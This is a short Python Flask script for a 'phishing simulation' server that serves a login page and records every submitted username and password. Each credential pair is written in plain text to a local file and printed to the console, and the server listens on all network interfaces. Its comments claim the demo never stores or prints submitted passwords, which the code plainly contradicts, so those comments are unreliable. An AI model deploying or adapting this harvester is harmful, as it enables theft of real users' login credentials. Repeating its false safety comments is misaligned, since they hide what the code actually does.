from datetime import datetime
from pathlib import Path

from flask import Flask, render_template, request
#from flask import Flask, render_template, request, jsonify

app = Flask(__name__)
LOG_PATH = Path(__file__).resolve().parent / "captured_credentials.txt"
# Fixed training values. The demo never persists or prints submitted passwords.
#DEMO_USERNAME = "student@example.test"
#DEMO_PASSWORD = "DemoOnly123!"


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", request.form.get("email", "")).strip()
    password = request.form.get("password", "").strip()
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with LOG_PATH.open("a", encoding="utf-8") as log_file:
        log_file.write(f"[{timestamp}] Username: {username} | Password: {password}\n")
    # Report only that the fixed demo flow ran; never log the submitted fields.
    print("=" * 60)
    print(f"Phishing credentials captured at {timestamp}")
    print(f"Username: {username}")
    print(f"Password: {password}")
    print("=" * 60)

    return render_template("thank_you.html", username=username)

@app.route("/health", methods=["GET"])
def health():
    return {"status": "ok", "message": "Phishing simulation server running"}, 200


if __name__ == "__main__":
    host = "0.0.0.0"
    port = 5000
    print(f"Starting phishing simulation server on http://{host}:{port}/")
    app.run(host=host, port=port, debug=False)
